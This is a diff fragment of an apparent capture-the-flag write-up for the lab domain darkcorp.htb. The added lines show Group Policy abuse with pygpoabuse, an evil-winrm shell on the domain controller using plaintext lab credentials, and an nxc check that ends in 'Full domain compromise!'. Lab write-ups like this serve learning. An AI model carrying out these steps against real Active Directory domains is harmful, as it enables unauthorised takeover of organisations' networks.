@@ -1366,8 +1366,40 @@ python3 pygpoabuse.py 'darkcorp.htb'/'taylor.b.adm':'!QAZzaq1' -gpo-id '652CAE9A
 Ill set the schedules task
 
 ```python
+evil-winrm -i dc-01.darkcorp.htb -u taylor.b.adm -p '!QAZzaq1'       
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\taylor.b.adm\Documents> gpupdate
+Updating policy...
 
+
+
+Computer Policy update has completed successfully.
+
+User Policy update has completed successfully.
+
+
+
+*Evil-WinRM* PS C:\Users\taylor.b.adm\Documents>
 ```
+
+Ill update the policy
+
+```python
+nxc smb dc-01.darkcorp.htb -u john -p 'H4x00r123..'  
+SMB         172.16.20.1     445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         172.16.20.1     445    DC-01            [+] darkcorp.htb\john:H4x00r123.. (Pwn3d!)
+```
+
+Full domain compromise!
+
+
 
 
 
